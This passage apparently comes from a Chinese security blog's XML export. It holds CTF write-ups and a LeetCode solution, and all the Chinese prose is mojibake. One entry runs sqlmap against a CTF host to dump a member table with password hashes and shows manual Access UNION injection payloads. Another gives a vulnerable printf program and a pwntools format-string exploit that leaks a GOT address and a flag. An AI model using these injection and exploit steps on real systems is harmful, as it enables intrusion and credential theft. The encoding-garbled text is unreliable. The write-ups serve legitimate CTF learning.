å¾ˆç–‘æƒ‘ ç¡®è®¤libcåŸºå€çš„æ–¹æ³•å¤§æ¦‚æœ‰ï¼š vmmap cat /proc/pid/mapsæŸ¥çœ‹è¿›ç¨‹çš„å†…å­˜åˆ†å¸ƒ åœ¨IDAä¸­æŸ¥æ‰¾åˆ°å‡½æ•°çœŸæ­£åŠ è½½çš„ä½ç½®ï¼Œç„¶åŽè®¡ç®—åç§» å‚è€ƒ è·¯ç”±å™¨æ¼æ´žæŒ–æŽ˜ä¹‹æ ˆæº¢å‡ºå…¥é—¨ï¼ˆä¸€ï¼‰(æ„Ÿè§‰è¿™ç¯‡æ–‡ç« ä¸­ç¬¬äºŒä¸ªç¨‹åºè°ƒè¯•çš„ä¸æ˜¯å¾ˆæ­£ç¡®ï¼Œå› ä¸ºåç§»è®¡ç®—çš„éƒ½ä¸ä¸€æ ·) è·¯ç”±å™¨æ¼æ´žæŒ–æŽ˜ä¹‹æ ˆæº¢å‡ºå…¥é—¨ï¼ˆäºŒï¼‰]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>MIPS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸¤é“sqlæ³¨å…¥é¢˜]]></title>
    <url>%2F2019%2F07%2F15%2F%E4%B8%A4%E9%81%93sql%E6%B3%A8%E5%85%A5%E9%A2%98%2F</url>
    <content type="text"><![CDATA[åŸºäºŽsqlçš„ç›²æ³¨ ä¹‹å‰ä¸€ç›´æ²¡æœ‰å¥½å¥½åœ°å­¦ä¹ è¿‡sqlmapçš„ä½¿ç”¨æ–¹æ³• å¦‚æžœæ˜¯é’ˆå¯¹postè¡¨å•è¿™ç§æ–¹å¼ å¯ä»¥å°†æŠ“åˆ°çš„åŒ…ä¿å­˜æˆä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åŽä½¿ç”¨ sqlmap.py -r &quot;post.txt&quot; -p n --dbs å…¶ä¸­-pæ˜¯æŒ‡å®šå‚æ•° sqlmapä¹Ÿå¯ä»¥è‡ªåŠ¨æœå¯»è¡¨å•sqlmap.py -u &quot;url&quot; --forms æŒ‡å®šå‚æ•° è¶æœºå­¦åˆ°äº†ä¸€æŠŠsqlmapä½¿ç”¨ è™½ç„¶è¿™ä¸ªé¢˜ç›®æ˜¯æœ‰ç‚¹ã€‚ã€‚ ä½†æ˜¯æ³¨å…¥ç‚¹çš„åˆ¤æ–­ä¹Ÿæ˜¯å¾ˆé‡è¦çš„ çˆ†åŽç«¯æ•°æ®åº“ python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; çˆ†æ•°æ®åº“ python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs æŒ‡å®šæ•°æ®åº“æŠ¥è¡¨çˆ†è¡¨ python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup --tables æŒ‡å®šæ•°æ®åº“å’Œè¡¨çˆ†å­—æ®µ python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member --columns æŒ‡å®šæ•°æ®åº“ï¼Œè¡¨ï¼Œå­—ç¬¦ç„¶åŽdumpå‡ºæ•°æ® python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member -C password --dump ![member](https://i.imgur.com/iRvoAHX. 123456789Database: stormgroupTable: member[2 entries]+-------+----------------------------------+--------+| name | password | status |+-------+----------------------------------+--------+| mozhe | 3114b433dece9180717f2b7de56b28a3 | 0 || mozhe | b7a0bebf8287c87253fb2958a390346a | 1 |+-------+----------------------------------+--------+ è§£å¯†ä¹‹åŽæ˜¯106370 è¿™æ ·å°±èƒ½ç™»é™†åŽå°äº† å¤ªç¥žå¥‡äº† å‚è€ƒ sqlmapä¹‹(å…­)----POSTç™»é™†æ¡†æ³¨å…¥å®žæˆ˜ SQLæ‰‹å·¥æ³¨å…¥æ¼æ´žæµ‹è¯•(Accessæ•°æ®åº“) è¿™é“é¢˜ç›®å°±æœ‰ç‚¹ç¥žå¥‡äº† çº¯é çŒœ order by 4åˆ¤æ–­æœ‰å¤šå°‘ä¸ªå­—æ®µ ç„¶åŽ new_list.asp?id=1 and exists(select * from admin)åˆ¤æ–­æ˜¯å¦å­˜åœ¨admin æŽ¥ä¸‹æ¥åˆ¤æ–­å›žæ˜¾ä½ç½® /new_list.asp?id=1 union select 1,2,3,4 from admin æŽ¥ä¸‹æ¥çŒœæµ‹å­—æ®µå€¼ and exists (select id from admin) çˆ†å‡ºå­—æ®µå€¼ union select 1,username,passwd,id from admin md5è§£å¯†ä¸€ä¸‹ç™»é™†å°±è¡Œäº† å‚è€ƒ]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode 2]]></title>
    <url>%2F2019%2F07%2F15%2FLeetcode-2%2F</url>
    <content type="text"><![CDATA[é”™è§£ æ€Žä¹ˆå¿«é€Ÿåœ°å°†é“¾è¡¨å€’ç½® ðŸ˜• æœ€åŽè¿˜æ˜¯å› ä¸ºæº¢å‡ºçš„é—®é¢˜ æ€è·¯ï¼š 12345678910111213141516171819202122â€‹ int k = 0; ListNode temp1 = l1; ListNode temp2 = l2; double resultl1 = 0; double resultl2 = 0; while (temp1 != null) &#123; int tempvalue = temp1.val; resultl1 = resultl1 + tempvalue * Math.pow(10, k); k++; temp1 = temp1.next; &#125; å°±æ˜¯å°†å…¶è½¬åŒ–ä¸ºæ•´æ•°ï¼Œå› ä¸ºé“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯æœ€ä½Žä½ï¼Œä¹‹åŽæ˜¯åä½ï¼Œç™¾ä½ç­‰ å°†å¾—åˆ°çš„ç»“æžœåœ¨è½¬åŒ–ä¸ºé“¾è¡¨ 1234567891011121314151617181920int result = (int) (resultl1 + resultl2);ListNode ans = new ListNode(0); //å…ˆå–ä¸€ä¸ªå¤´èŠ‚ç‚¹ListNode head = ans;int length = Integer.toString(result).length();for (int i = 0; i &lt; length; i++) &#123; ListNode temp = new ListNode(result % 10); head.next = temp; head = head.next; result = result / 10;&#125; è®°å½•ä¸€ä¸‹å°†æ•´æ•°è½¬ä¸ºstringçš„æ“ä½œ Integer.toString(result) Math.powå‡½æ•°çš„è¿”å›žå€¼å¿…é¡»æ˜¯doubleç±»åž‹çš„ ä½†æ˜¯è¿™æ ·ä¼šé¢ä¸´ä¸€ä¸ªé—®é¢˜ï¼Œä¹Ÿå°±æ˜¯æœ€å¼€å›¾ç‰‡çš„é‚£ä¸ªï¼Œæº¢å‡ºï¼ æ­£è§£ çœ‹äº†çœ¼ç­”æ¡ˆï¼Œæ‰æ˜Žç™½è‡ªå·±ä»Žå¼€å§‹å°±æƒ³é”™äº† 1234567891011121314151617181920212223242526272829303132333435363738public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123; ListNode dummyHead = new ListNode(0); ListNode p = l1, q = l2, curr = dummyHead; int carry = 0; while (p != null || q != null) &#123; int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; carry = sum / 10; curr.next = new ListNode(sum % 10); curr = curr.next; if (p != null) p = p.next; if (q != null) q = q.next; &#125; if (carry &gt; 0) &#123; curr.next = new ListNode(carry); &#125; return dummyHead.next;&#125; æœ€å…³é”®çš„å°±æ˜¯ ==int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; carry = sum / 10; curr.next = new ListNode(sum % 10);== å…¶å®žåªéœ€è¦ä»Žä½Žä½å¼€å§‹ä¸€ä½ä½çš„åŠ ä¸ŠåŽ»å°±å¥½äº†ã€‚ ç„¶åŽå†æŠŠå®ƒä»¬ç»™é“¾èµ·æ¥]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[æ ¼å¼åŒ–å­—ç¬¦ä¸²åˆ†æž]]></title>
    <url>%2F2019%2F05%2F04%2F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[æ ¼å¼åŒ–å­—ç¬¦ä¸² è¿™ä¸ªé¢˜ç›®æ˜¯ctfwikiä¸Šçš„ cä»£ç å¦‚ä¸‹ï¼š 123456789#include &lt;stdio.h&gt;int main() &#123; char s[100]; int a = 1, b = 0x22222222, c = -1; scanf("%s", s); printf("%08x.%08x.%08x.%s\n", a, b, c, s); printf(s); return 0;&#125; ï¼ˆçªç„¶å‘çŽ°è…¾è®¯æ–‡æ¡£å±…ç„¶è¿˜æ”¯æŒä»£ç å¥½å¼ºå•Š æˆ‘ä»¬ç¼–è¯‘ä¸€ä¸‹ï¼š 1gcc -m32 -fno-stack-protector -no-pie -o leakMemory leakMemory.c -g æŠŠä¿æŠ¤æŽªæ–½éƒ½å…³æŽ‰äº† 1234567 % checksec leakMemory [*] '/home/abc/Desktop/pwn/leakMemory/leakMemory' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) å…ˆçœ‹ä¸€ä¸‹å‡ ä¸ªpayload 12345678pwndbg&gt; b printfBreakpoint 1 at 0x8048330pwndbg&gt; rStarting program: /home/abc/Desktop/pwn/leakMemory/leakMemory %08x.%08x.%08xBreakpoint 1, __printf (format=0x8048593 "%08x.%08x.%08x.%s\n") at printf.c:2828printf.c: No such file or directory. åœ¨printfå¤„ä¸‹æ–­ç‚¹ æ­¤æ—¶æ ˆä¸Šçš„å¸ƒå±€å¦‚ä¸‹ 12345600:0000â”‚ esp 0xffffcf9c â€”â–¸ 0x80484ea (main+100) â—‚â€” add esp, 0x2001:0004â”‚ 0xffffcfa0 â€”â–¸ 0x8048593 â—‚â€” and eax, 0x2e783830 /* '%08x.%08x.%08x.%s\n' */02:0008â”‚ 0xffffcfa4 â—‚â€” 0x103:000câ”‚ 0xffffcfa8 â—‚â€” 0x22222222 ('""""')04:0010â”‚ 0xffffcfac â—‚â€” 0xffffffff05:0014â”‚ 0xffffcfb0 â€”â–¸ 0xffffcfc0 â—‚â€” '%08x.%08x.%08x' continueä¸€ä¸‹ï¼š 123456pwndbg&gt; cContinuing.00000001.22222222.ffffffff.%08x.%08x.%08xBreakpoint 1, __printf (format=0xffffcfc0 "%08x.%08x.%08x") at printf.c:2828in printf.c è¾“å‡ºäº†ä¿¡æ¯çš„åŒæ—¶ï¼Œ å‘½ä¸­ç¬¬äºŒä¸ªæ–­ç‚¹ æ­¤æ—¶æ ˆä¸Šçš„å¸ƒå±€å¦‚ä¸‹ï¼š 1234567800:0000â”‚ esp 0xffffcfac â€”â–¸ 0x80484f9 (main+115) â—‚â€” add esp, 0x1001:0004â”‚ 0xffffcfb0 â€”â–¸ 0xffffcfc0 â—‚â€” '%08x.%08x.%08x'... â†“03:000câ”‚ 0xffffcfb8 â€”â–¸ 0xf7fcf410 â€”â–¸ 0x8048278 â—‚â€” inc edi /* 'GLIBC_2.0' */04:0010â”‚ 0xffffcfbc â€”â–¸ 0x804849d (main+23) â—‚â€” add ebx, 0x1b6305:0014â”‚ eax 0xffffcfc0 â—‚â€” '%08x.%08x.%08x'06:0018â”‚ 0xffffcfc4 â—‚â€” '.%08x.%08x'07:001câ”‚ 0xffffcfc8 â—‚â€” 'x.%08x' æ­¤æ—¶printfå‡½æ•°ä¼šæŠŠæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹‹åŽçš„æ ˆä¸Šçš„ä¿¡æ¯å½“ä½œå‚æ•°æ‰“å°å‡ºæ¥ï¼š contiueä¸€ä¸‹ 123pwndbg&gt; cContinuing.ffffcfc0.f7fcf410.0804849d[Inferior 1 (process 4975) exited normally] ä¹‹å‰æ ˆä¸Šçš„ä¿¡æ¯æ˜¾ç¤ºçš„ä¸å…¨ï¼Œæ ˆçš„å†…å­˜å¦‚ä¸‹ï¼š 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d0xffffcfc0:0x78383025 0x3830252e 0x30252e78 0x000078380xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0x6f984f000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 0xffffcfb0 æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åœ°å€ï¼Œ æˆ‘ä»¬çœ‹åˆ°æ­¤æ—¶printfå‡½æ•°å°†0xffffcfc0 0xf7fcf410 0x0804849d éƒ½æ‰“å°å‡ºæ¥äº†ï¼Œ ä¹Ÿå°±æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¹‹åŽçš„ä¸‰ä¸ªä½ç½®çš„ä¿¡æ¯ æˆ‘ä»¬é€šè¿‡è¿™ç§æ–¹å¼æ³„éœ²æ ˆçš„ä¿¡æ¯ï¼Œä½†æ˜¯ä¹Ÿå¯ä»¥ç›´æŽ¥åŽ»å–å¾—æ ˆä¸­è¢«è§†ä¸ºç¬¬n+1ä¸ªå‚æ•°çš„å€¼ è‡³äºŽä¸ºä»€ä¹ˆæ˜¯ç¬¬n+1, è¿™æ˜¯å› ä¸ºæ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯ç¬¬ä¸€ä¸ªå‚æ•° æ¯”å¦‚ é€šè¿‡ %3$x(è¿™ä¸ªçš„åŽŸç†æ˜¯å•¥ï¼Ÿä¸ºä»€ä¹ˆè¦åŠ $ç¬¦å·) æˆ‘ä»¬å¯ä»¥æ³„éœ²æ ˆä¸Šè¢«è§†ä¸ºç¬¬4ä¸ªå‚æ•°çš„å€¼ æ ˆå¸ƒå±€å¦‚ä¸‹ï¼š(å·¦è¾¹çš„ä¸€åˆ—æ˜¯æ ˆåœ°å€ï¼Œä¹Ÿå°±æ˜¯å†…å­˜çš„åœ°å€ï¼Œç®­å¤´ä»£è¡¨äº†è¿™ä¸ªå†…å­˜å•å…ƒå­˜å‚¨çš„æ•°æ®ï¼Œå¦‚æžœæ˜¯æŒ‡é’ˆè¿˜ä¼šè¿›ä¸€æ­¥æŒ‡ç¤º) 1234567800:0000â”‚ esp 0xffffcfac â€”â–¸ 0x80484f9 (main+115) â—‚â€” add esp, 0x1001:0004â”‚ 0xffffcfb0 â€”â–¸ 0xffffcfc0 â—‚â€” '%3$x'... â†“(è¿™é‡Œæ˜¯çœç•¥å·ï¼Œæ˜¯ä¸æ˜¯å°±æ˜¯ç›´æŽ¥æŒ‡å‘äº†ï¼Œä¸­é—´é‚£ä¸ªå°±è¢«è·³è¿‡äº†)03:000câ”‚ 0xffffcfb8 â€”â–¸ 0xf7fcf410 â€”â–¸ 0x8048278 â—‚â€” inc edi /* 'GLIBC_2.0' */04:0010â”‚ 0xffffcfbc â€”â–¸ 0x804849d (main+23) â—‚â€” add ebx, 0x1b6305:0014â”‚ eax 0xffffcfc0 â—‚â€” '%3$x'06:0018â”‚ 0xffffcfc4 â—‚â€” 0x007:001câ”‚ 0xffffcfc8 â€”â–¸ 0xf7ffd940 â—‚â€” 0x0 åŒæ ·çœ‹ä¸æ¸…ï¼Œ è¿˜æ˜¯ç›´æŽ¥æ‰“å°å†…å­˜ä¿¡æ¯å§(xå‘½ä»¤çš„ç”¨æ³•ï¼Œè¿™é‡Œæ˜¾ç¤ºçš„æ˜¯å†…å­˜åœ°å€ä»Ž0xffffcfb0å¼€å§‹çš„ï¼Œå› ä¸ºå†…å­˜æ˜¯æŒ‰ç…§å­—èŠ‚ç¼–å€çš„ï¼Œæ‰€ä»¥ä¸€è¡Œæ­£å¥½æ˜¯16ä¸ªå­—èŠ‚å†…å­˜åœ°å€å°±æ˜¯åŠ 10) 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d (0xffffcfb0è¿™ä¸ªå†…å­˜å•å…ƒæŒ‡å‘äº†0xffffcfc0)0xffffcfc0:0x78243325 0x00000000 0xf7ffd940 0x000000c2 (çœ‹å†…å­˜å•å…ƒ0xffffcfc0å­˜æ”¾çš„å†…å®¹å°±æ˜¯x$3%)0xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0xd6a577000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 çŒœçŒœè¿™æ—¶å€™æ‰“å°çš„ä¿¡æ¯æ˜¯å•¥ï¼Ÿ ç­”æ¡ˆæ˜¯æ ˆä¸Šè¢«è§†ä¸ºç¬¬å››ä¸ªå‚æ•°çš„ä¿¡æ¯ï¼š 0x0804849d åŒæ ·çš„æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡%sæ¥å¾—åˆ°å­—ç¬¦ä¸²çš„ä¿¡æ¯ æ ˆå¸ƒå±€å¦‚ä¸‹ï¼š 1234567800:0000â”‚ esp 0xffffcfac â€”â–¸ 0x80484f9 (main+115) â—‚â€” add esp, 0x1001:0004â”‚ 0xffffcfb0 â€”â–¸ 0xffffcfc0 â—‚â€” 0x7325 /* '%s' */... â†“03:000câ”‚ 0xffffcfb8 â€”â–¸ 0xf7fcf410 â€”â–¸ 0x8048278 â—‚â€” inc edi /* 'GLIBC_2.0' */04:0010â”‚ 0xffffcfbc â€”â–¸ 0x804849d (main+23) â—‚â€” add ebx, 0x1b6305:0014â”‚ eax 0xffffcfc0 â—‚â€” 0x7325 /* '%s' */06:0018â”‚ 0xffffcfc4 â—‚â€” 0x107:001câ”‚ 0xffffcfc8 â€”â–¸ 0xf7ffd940 â—‚â€” 0x0 è¿˜æ˜¯çœ‹ä¸æ¸…ï¼Œç›´æŽ¥çœ‹å†…å­˜å§(md åžƒåœ¾pwndbg) 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d0xffffcfc0:0x00007325 0x00000001 0xf7ffd940 0x000000c20xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0xf1ae29000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 è¿™ä¸ªæ—¶å€™ä¼šç›´æŽ¥å°† 0xffffcfc0 å¯¹åº”çš„å­—ç¬¦ä¸²æ‰“å°å‡ºæ¥ ç»“æžœè‡ªç„¶å°±æ˜¯ %säº† å¦‚æžœæˆ‘ä»¬è¾“å…¥%2$s, è¿™ä¸ªæ—¶å€™å°±å¾ˆæœ‰è¶£äº†ï¼Œ æŒ‰ç…§é“ç†ç¨‹åºä¼šå°† 0xf7fcf410 å¯¹åº”åœ°å€çš„å½“ä½œå­—ç¬¦ä¸²æ‰“å°å‡ºæ¥ï¼Œ å¯æ˜¯å¦‚æžœè¿™ä¸ªåœ°å€æ— æ•ˆå‘¢ï¼Ÿ æˆ‘è‡ªå·±å°è¯•çš„ç»“æžœæ˜¯ç›´æŽ¥é€€å‡ºäº†ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰æ‰“å°å‡ºæ¥emm è¿™æ—¶å€™å¦‚æžœæˆ‘ä»¬æŒ‡å®šä¸€ä¸ªåˆæ³•çš„åœ°å€ï¼Œ æ¯”å¦‚gotè¡¨ä¸­æŸä¸ªå‡½æ•°çš„åœ°å€è¿™å°±å¾ˆç¥žå¥‡äº† expå¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627from pwn import *import timesh = process('./leakMemory')context.log_level = 'debug'leakmemory = ELF('./leakMemory')__isoc99_scanf_got = leakmemory.got['__isoc99_scanf']print hex(__isoc99_scanf_got)payload = p32(__isoc99_scanf_got) + '%4$s'print payloadpayload1 = '%4$s' #è¿™ä¸¤ä¸ªpayloadæ˜¯è‡ªå·±æµ‹è¯•çš„payload2 = 'AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p'gdb.attach(sh)#time.sleep(1)sh.sendline(payload)sh.recvuntil('%4$s\n')#print sh.recvuntil('%4$s\n')#print '\n'print hex(u32(sh.recv()[4:8])) # remove the first bytes of __isoc99_scanf@gotsh.interactive() æˆ‘ä»¬è¿è¡Œè¿™ä¸ªexp åœ¨pwndbgä¸­ä¸‹æ–­ç‚¹ è¿è¡Œåˆ°ç¬¬äºŒä¸ªprintfçš„æ—¶å€™ 123456789â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€00:0000â”‚ esp 0xffa3bdfc â€”â–¸ 0x80484f9 (main+115) â—‚â€” add esp, 0x1001:0004â”‚ 0xffa3be00 â€”â–¸ 0xffa3be10 â€”â–¸ 0x804a014 (_GLOBAL_OFFSET_TABLE_+20) â€”â–¸ 0xf7df2bb0 (__isoc99_scanf) â—‚â€” push ebp... â†“03:000câ”‚ 0xffa3be08 â€”â–¸ 0xf7f85410 â€”â–¸ 0x8048278 â—‚â€” inc edi /* 'GLIBC_2.0' */04:0010â”‚ 0xffa3be0c â€”â–¸ 0x804849d (main+23) â—‚â€” add ebx, 0x1b6305:0014â”‚ eax 0xffa3be10 â€”â–¸ 0x804a014 (_GLOBAL_OFFSET_TABLE_+20) â€”â–¸ 0xf7df2bb0 (__isoc99_scanf) â—‚â€” push ebp06:0018â”‚ 0xffa3be14 â—‚â€” '%4$s'07:001câ”‚ 0xffa3be18 â€”â–¸ 0xf7fb3900 (catch_hook) â—‚â€” 0x0 å¦ä¸€è¾¹ 123456789[+] Waiting for debugger: Done[DEBUG] Sent 0x9 bytes: 00000000 14 a0 04 08 25 34 24 73 0a â”‚Â·Â·Â·Â·â”‚%4$sâ”‚Â·â”‚ 00000009[DEBUG] Received 0x24 bytes: 00000000 30 30 30 30 30 30 30 31 2e 32 32 32 32 32 32 32 â”‚0000â”‚0001â”‚.222â”‚2222â”‚ 00000010 32 2e 66 66 66 66 66 66 66 66 2e 14 a0 04 08 25 â”‚2.ffâ”‚ffffâ”‚ff.Â·â”‚Â·Â·Â·%â”‚ 00000020 34 24 73 0a â”‚4$sÂ·â”‚â”‚ 00000024 continue 1234567[DEBUG] Received 0x8 bytes: 00000000 14 a0 04 08 b0 2b df f7 â”‚Â·Â·Â·Â·â”‚Â·+Â·Â·â”‚â”‚ 000000080xf7df2bb0[*] Switching to interactive mode[*] Process './leakMemory' stopped with exit code 0 (pid 5064)[*] Got EOF while reading in interactive è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±å¾—åˆ°äº†scanfå‡½æ•°çš„åœ°å€äº† ok è¿˜æœ‰å‡ ä¸ªåœ°æ–¹æ²¡å¼„æ˜Žç™½ä¹‹åŽå†å†™ ç¡®å®šå¯æŽ§åˆ¶æ ¼å¼åŒ–å­—ç¬¦ä¸²ä½ç½®çš„æ–¹æ³• æ—¢ç„¶ç¨‹åºæ˜¯æœ‰æ¼æ´žçš„ï¼Œæˆ‘ä»¬å°±å¿…é¡»çŸ¥é“å¯è¢«æŽ§åˆ¶çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ä½ç½®ï¼Œè¿™æ—¶å€™å¤§è‡´æœ‰ä»¥ä¸‹å‡ ç§å§¿åŠ¿ æž„é€ ç±»ä¼¼ [tag]%p%p%p%p%p%p...è¿™æ ·çš„å‚æ•° Pwngdbä¸­æœ‰ä¸€ä¸ªå«åšfmargå¯ä»¥ç”¨æ¥èŽ·å–æŒ‡å®šåœ°å€åˆ°åº•æ˜¯ç¬¬å‡ ä¸ªå‚æ•° ä¸æ˜¯å¾ˆç†è§£ç¬¬ä¸€ç§æ–¹æ³•åŽŸç†ï¼Œä½†æ˜¯ç¬¬äºŒç§æ–¹æ³•æ¯”è¾ƒå¥½ç”¨ ä¸è¿‡æˆ‘ä»¬å¯ä»¥æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š IDAä¸­çš„Cä»£ç ï¼š 12345678910111213141516171819202122232425262728293031323334353637int __cdecl main(int argc, const char **argv, const char **envp)&#123; char v4; // [rsp+3h] [rbp-3Dh] signed int i; // [rsp+4h] [rbp-3Ch] signed int j; // [rsp+4h] [rbp-3Ch] char *format; // [rsp+8h] [rbp-38h] _IO_FILE *fp; // [rsp+10h] [rbp-30h] char *v9; // [rsp+18h] [rbp-28h] char v10[24]; // [rsp+20h] [rbp-20h] unsigned __int64 v11; // [rsp+38h] [rbp-8h] v11 = __readfsqword(0x28u); fp = fopen("flag.txt", "r"); for ( i = 0; i &lt;= 21; ++i ) v10[i] = _IO_getc(fp); fclose(fp); v9 = v10; puts("what's the flag"); fflush(_bss_start); format = 0LL; __isoc99_scanf("%ms", &amp;format); for ( j = 0; j &lt;= 21; ++j ) &#123; v4 = format[j]; if ( !v4 || v10[j] != v4 ) &#123; puts("You answered:"); printf(format); puts("\nBut that was totally wrong lol get rekt"); fflush(_bss_start); return 0; &#125; &#125; printf("That's right, the flag is %s\n", v9); fflush(_bss_start); return 0;&#125; æ˜¾ç„¶çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ž æˆ‘ä»¬éœ€è¦åœ¨printfå‡½æ•°å¤„ä¸‹æ–­ç‚¹ ç„¶åŽéšä¾¿è¾“å…¥ä¸€äº›æ•°å­—: 123456789101112131415161718192021222324[-------------------------------------code-------------------------------------] 0x7ffff7a48e6c &lt;__fprintf+172&gt;: call 0x7ffff7b18c80 &lt;__stack_chk_fail&gt; 0x7ffff7a48e71: nop WORD PTR cs:[rax+rax*1+0x0] 0x7ffff7a48e7b: nop DWORD PTR [rax+rax*1+0x0]=&gt; 0x7ffff7a48e80 &lt;__printf&gt;: sub rsp,0xd8 0x7ffff7a48e87 &lt;__printf+7&gt;: test al,al 0x7ffff7a48e89 &lt;__printf+9&gt;: mov QWORD PTR [rsp+0x28],rsi 0x7ffff7a48e8e &lt;__printf+14&gt;: mov QWORD PTR [rsp+0x30],rdx 0x7ffff7a48e93 &lt;__printf+19&gt;: mov QWORD PTR [rsp+0x38],rcx[------------------------------------stack-------------------------------------]0000| 0x7fffffffde08 --&gt; 0x400890 (&lt;main+234&gt;: mov edi,0x4009b8)0008| 0x7fffffffde10 --&gt; 0x61000001 0016| 0x7fffffffde18 --&gt; 0x602cb0 ('a' &lt;repeats 16 times&gt;)0024| 0x7fffffffde20 --&gt; 0x602260 --&gt; 0x0 0032| 0x7fffffffde28 --&gt; 0x7fffffffde30 ("flag&#123;", '1' &lt;repeats 12 times&gt;, "&#125;\n\377\377\377")0040| 0x7fffffffde30 ("flag&#123;", '1' &lt;repeats 12 times&gt;, "&#125;\n\377\377\377")0048| 0x7fffffffde38 ("111111111&#125;\n\377\377\377")0056| 0x7fffffffde40 --&gt; 0xffffff0a7d31 [------------------------------------------------------------------------------]Legend: code, data, rodata, valueBreakpoint 1, __printf (format=0x602cb0 'a' &lt;repeats 16 times&gt;) at printf.c:2828 printf.c: No such file or directory. è¿™æ—¶å€™å¯ä»¥çœ‹åˆ°flagäº†ï¼Œæ³¨æ„æˆ‘ä»¬æ˜¯åœ¨æœ¬åœ°è°ƒè¯•ï¼Œè°ƒè¯•çš„æ—¶å€™å½“ç„¶å¯ä»¥çœ‹åˆ°flagï¼Œä¸€èˆ¬çš„pwné¢˜éƒ½æ˜¯è¦è¿œç¨‹è¿žæŽ¥çš„ å¦‚æžœæˆ‘ä»¬è¦æ³„éœ²flagçš„å€¼ï¼Œå°±éœ€è¦æž„é€ %n$sè¿™æ ·çš„ä¼ è¿›åŽ»ã€‚æ‰€ä»¥èŽ·å–å‚æ•°çš„ä½ç½®å¾ˆå…³é”® 12gdb-peda$ fmtarg 0x7fffffffde28The index of format argument : 10 ("\%9$p") é€šè¿‡Pwngdbå°±å¯ä»¥æŸ¥çœ‹å‚æ•°çš„ä½ç½®äº† è¿™æ—¶å€™è¿è¡Œ 12345678abc@ubuntu ~/Desktop/pwnEaxmple/zifuchuan % ./goodluck what's the flag%9$sYou answered:flag&#123;111111111111&#125;ï¿½ï¿½ï¿½But that was totally wrong lol get rekt å°±å¾—åˆ°äº†flag (è¿™é‡Œå€¼å¾—æ³¨æ„çš„å°±æ˜¯ï¼Œ64ä½ç³»ç»Ÿå’Œ32ä½ç³»ç»Ÿä¼ å‚æ˜¯ä¸ä¸€æ ·çš„)]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku webé¢˜ç›®çš„wp]]></title>
    <url>%2F2019%2F02%2F07%2Fbugku-web%E9%A2%98%E7%9B%AE%E7%9A%84wp%2F</url>
